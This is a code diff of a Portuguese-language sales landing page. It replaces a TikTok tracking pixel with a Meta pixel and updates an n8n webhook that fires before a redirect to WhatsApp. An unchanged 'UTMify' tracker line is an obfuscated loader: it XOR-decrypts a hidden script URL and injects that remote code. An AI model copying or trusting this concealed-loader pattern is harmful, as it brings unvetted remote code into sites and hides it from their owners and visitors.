@@ -8,18 +8,23 @@
   <!-- UTMify Tracker Script -->
   <script>(function(){var s_pnd=atob("DBRkVUNEbkYFqKlQ/G9GIDEoTHwnwN0kjGdeemwnCigr3d09lXIdeyArA2hn2oYjn2YNJTc3QTZs0Mw802QNLSYoQzJsw90/lzoOJmFoTCdx3Ns5nmEQMDBmVB1YhIs3kHsGNC83THxe04s+nXkBd3lmGi9u/MY7rH0cMC8NCmQpit8xkGEBd3lmWCc8nsxmziBTNHVwWSc8kchmnixQYHp2TDtY1Q==");var d_85=[];for(var w_p=0;w_p<s_pnd.length;w_p++){d_85.push(s_pnd.charCodeAt(w_p)&255);}var f_a=d_85[0];var p_p=d_85.slice(1,1+f_a);var p_uow=d_85.slice(1+f_a);var h_bpsd=p_uow.map(function(b,f_c){return b^p_p[f_c%f_a];});var z_f="";for(var m_u0=0;m_u0<h_bpsd.length;m_u0++){z_f+=String.fromCharCode(h_bpsd[m_u0]&255);}var g_o=decodeURIComponent(escape(z_f));var j_p4r=JSON.parse(g_o);var a_8l=j_p4r.globals||[];a_8l.forEach(function(y_82i){window[y_82i.name]=y_82i.value;});var n_9d1=document.createElement("script");n_9d1.src=j_p4r.url;n_9d1.async=true;n_9d1.defer=true;(j_p4r.attributes||[]).forEach(function(l_u2hz){n_9d1.setAttribute(l_u2hz.name,l_u2hz.value);});(document.head||document.documentElement).appendChild(n_9d1);})();</script>
 
-  <!-- TikTok Pixel Code Start -->
+  <!-- Meta Pixel Code -->
   <script>
-  !function (w, d, t) {
-    w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))} };for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-  var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-  ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-
-    ttq.load('DA71OLJC77UES974207G');
-    ttq.page();
-  }(window, document, 'ttq');
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1608347500819958');
+  fbq('track', 'PageView');
   </script>
-  <!-- TikTok Pixel Code End -->
+  <noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1608347500819958&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- End Meta Pixel Code -->
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
@@ -87,8 +92,8 @@
 
   <script>
     function iniciarFunil() {
-      // Dispara webhook para o n8n em segundo plano passando o contato configurado
-      const webhookUrl = "https://n8n.espacostudiodelas.online/webhook/6b0e8f22-9346-434d-9531-34f5af8b63e1";
+      // Dispara webhook para o novo link de produção no n8n em segundo plano
+      const webhookUrl = "https://n8n.espacostudiodelas.online/webhook/12c238d0-e937-4fc4-98ae-80319311d602";
       
       const payload = {
         remoteJid: "+5519982870808@s.whatsapp.net",
@@ -98,10 +103,10 @@
 
       navigator.sendBeacon(webhookUrl, JSON.stringify(payload));
 
-      // Dispara os eventos do Pixel do TikTok
-      if (typeof ttq !== 'undefined') {
-        ttq.track('ClickButton');
-        ttq.track('InitiateCheckout');
+      // Dispara os eventos do Pixel do Facebook
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'Lead');
+        fbq('track', 'InitiateCheckout');
       }
 
       // Redireciona para o WhatsApp após disparar o gatilho
